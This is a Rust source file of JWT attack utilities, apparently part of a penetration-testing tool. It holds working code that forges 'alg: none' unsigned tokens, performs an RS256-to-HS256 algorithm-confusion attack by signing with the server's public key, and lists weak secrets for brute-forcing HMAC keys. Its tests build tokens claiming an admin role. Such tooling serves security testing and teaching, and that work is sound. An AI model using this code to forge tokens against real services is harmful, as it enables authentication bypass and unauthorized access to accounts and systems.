//! JWT manipulation utilities

use base64::{Engine as _, engine::general_purpose::URL_SAFE_NO_PAD};
use serde_json::Value;

/// Decoded JWT
#[derive(Debug, Clone)]
pub struct DecodedJwt {
    pub header: Value,
    pub payload: Value,
    pub signature: String,
}

impl DecodedJwt {
    /// Decode a JWT without verification
    pub fn decode(token: &str) -> Result<Self, String> {
        let parts: Vec<&str> = token.split('.').collect();
        if parts.len() != 3 {
            return Err("Invalid JWT format".to_string());
        }

        let header_bytes = URL_SAFE_NO_PAD
            .decode(parts[0])
            .map_err(|e| e.to_string())?;
        let payload_bytes = URL_SAFE_NO_PAD
            .decode(parts[1])
            .map_err(|e| e.to_string())?;

        let header: Value = serde_json::from_slice(&header_bytes).map_err(|e| e.to_string())?;
        let payload: Value = serde_json::from_slice(&payload_bytes).map_err(|e| e.to_string())?;

        Ok(Self {
            header,
            payload,
            signature: parts[2].to_string(),
        })
    }
}

/// Create an unsigned JWT (alg: none attack)
pub fn create_unsigned(payload: &Value) -> String {
    let header = serde_json::json!({"alg": "none", "typ": "JWT"});
    let header_b64 = URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
    let payload_b64 = URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());
    format!("{}.{}.", header_b64, payload_b64)
}

/// Create a HS256 JWT with a secret
pub fn create_hs256(payload: &Value, secret: &str) -> String {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    let header = serde_json::json!({"alg": "HS256", "typ": "JWT"});
    let header_b64 = URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
    let payload_b64 = URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());
    let message = format!("{}.{}", header_b64, payload_b64);

    let mut mac =
        Hmac::<Sha256>::new_from_slice(secret.as_bytes()).expect("HMAC can take key of any size");
    mac.update(message.as_bytes());
    let signature = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());

    format!("{}.{}", message, signature)
}

/// Algorithm confusion: RS256 to HS256 attack
pub fn alg_confusion_attack(original_token: &str, public_key: &str) -> Result<String, String> {
    let decoded = DecodedJwt::decode(original_token)?;

    // Create new header with HS256
    let header = serde_json::json!({"alg": "HS256", "typ": "JWT"});
    let header_b64 = URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
    let payload_b64 = URL_SAFE_NO_PAD.encode(decoded.payload.to_string().as_bytes());
    let message = format!("{}.{}", header_b64, payload_b64);

    // Sign with public key as HMAC secret
    use hmac::{Hmac, Mac};
    use sha2::Sha256;

    let mut mac = Hmac::<Sha256>::new_from_slice(public_key.as_bytes())
        .expect("HMAC can take key of any size");
    mac.update(message.as_bytes());
    let signature = URL_SAFE_NO_PAD.encode(mac.finalize().into_bytes());

    Ok(format!("{}.{}", message, signature))
}

/// Common JWT weak secrets
pub fn weak_secrets() -> Vec<&'static str> {
    vec![
        "secret",
        "password",
        "123456",
        "qwerty",
        "jwt_secret",
        "your-256-bit-secret",
        "supersecret",
        "key",
        "private",
        "admin",
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_create_unsigned() {
        let jwt = create_unsigned(&serde_json::json!({"role": "admin"}));
        assert!(jwt.ends_with('.'));
        let decoded = DecodedJwt::decode(&jwt).unwrap();
        assert_eq!(decoded.header["alg"], "none");
    }

    #[test]
    fn test_create_hs256() {
        let jwt = create_hs256(&serde_json::json!({"user": "admin"}), "secret");
        let parts: Vec<&str> = jwt.split('.').collect();
        assert_eq!(parts.len(), 3);
        assert!(!parts[2].is_empty());
    }
}
